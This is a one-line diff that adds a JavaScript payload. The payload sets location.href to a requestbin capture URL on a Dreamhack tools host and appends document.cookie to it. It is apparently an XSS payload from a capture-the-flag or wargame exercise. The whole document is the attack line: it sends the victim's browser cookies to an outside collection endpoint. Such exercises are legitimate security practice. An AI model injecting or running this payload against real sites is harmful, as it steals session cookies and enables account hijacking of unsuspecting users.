@@ -1,0 +1,1 @@
+location.href="https://tools.dreamhack.games/requestbin/bnmyqld/"+document.cookie
